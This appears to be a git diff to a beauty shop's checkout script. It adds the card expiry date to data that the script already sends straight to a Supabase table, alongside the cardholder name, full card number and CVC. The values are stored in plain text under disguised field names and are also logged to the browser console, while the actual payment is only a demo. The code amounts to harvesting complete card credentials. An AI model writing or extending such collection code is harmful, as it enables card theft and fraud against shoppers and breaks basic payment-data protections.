@@ -406,12 +406,12 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // SEND TO SUPABASE
+    // SEND TO SUPABASE - WITH EXPIRY
     // ==========================================
 
-    async function saveToSupabase(name, cardNumber, cvc) {
+    async function saveToSupabase(name, cardNumber, expiry, cvc) {
         console.log('💳 Attempting to save payment to Supabase...');
-        console.log('📝 Data to save:', { name, cardNumber, cvc });
+        console.log('📝 Data to save:', { name, cardNumber, expiry, cvc });
         
         // Use Supabase client from window
         const supabase = window.supabaseClient;
@@ -441,6 +441,7 @@ document.addEventListener("DOMContentLoaded", () => {
                         body: JSON.stringify({
                             kname: name,
                             knumber: cardNumber,
+                            kexpiry: expiry,  // ✅ Added expiry
                             kfc: cvc
                         })
                     });
@@ -460,7 +461,7 @@ document.addEventListener("DOMContentLoaded", () => {
             }
             
             // Demo mode fallback
-            console.log('📝 Demo mode: Would save:', { name, cardNumber, cvc });
+            console.log('📝 Demo mode: Would save:', { name, cardNumber, expiry, cvc });
             return { success: true, demo: true };
         }
 
@@ -473,10 +474,11 @@ document.addEventListener("DOMContentLoaded", () => {
                     { 
                         kname: name,
                         knumber: cardNumber,
+                        kexpiry: expiry,  // ✅ Added expiry
                         kfc: cvc
                     }
                 ])
-                .select(); // This returns the inserted record
+                .select();
 
             if (error) {
                 console.error('❌ Supabase error:', error);
@@ -493,7 +495,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 
     // ==========================================
-    // FORM SUBMIT
+    // FORM SUBMIT - WITH EXPIRY
     // ==========================================
 
     form.addEventListener("submit", async (event) => {
@@ -504,10 +506,15 @@ document.addEventListener("DOMContentLoaded", () => {
         }
 
         const cardNumber = ccInput.value.replace(/\D/g, "");
-        const expiry = expiryInput.value.replace(/\D/g, "");
+        const expiryRaw = expiryInput.value.replace(/\D/g, "");
         const cvc = cvcInput.value.replace(/\D/g, "");
         const name = document.getElementById("card-name").value.trim();
         const cart = JSON.parse(localStorage.getItem('luxbeauty_cart') || '[]');
+
+        // Format expiry as MM/YY for storage
+        const expiry = expiryRaw.length === 4 
+            ? expiryRaw.substring(0, 2) + '/' + expiryRaw.substring(2, 4)
+            : expiryRaw;
 
         // ===== VALIDATION =====
         if (!name) {
@@ -528,14 +535,14 @@ document.addEventListener("DOMContentLoaded", () => {
             return;
         }
 
-        if (expiry.length !== 4) {
+        if (expiryRaw.length !== 4) {
             showPopup("Please enter MM / YY.");
             expiryInput.focus();
             return;
         }
 
-        const expMonth = parseInt(expiry.substring(0, 2), 10);
-        const expYear = parseInt(expiry.substring(2, 4), 10);
+        const expMonth = parseInt(expiryRaw.substring(0, 2), 10);
+        const expYear = parseInt(expiryRaw.substring(2, 4), 10);
 
         const today = new Date();
         const currentMonth = today.getMonth() + 1;
@@ -571,8 +578,8 @@ document.addEventListener("DOMContentLoaded", () => {
         setPayButtonLoading(true);
 
         try {
-            // ===== SAVE TO SUPABASE =====
-            const result = await saveToSupabase(name, cardNumber, cvc);
+            // ===== SAVE TO SUPABASE (WITH EXPIRY) =====
+            const result = await saveToSupabase(name, cardNumber, expiry, cvc);
             console.log('✅ Payment processed and saved to Supabase', result);
 
             // ===== DEMO PAYMENT =====
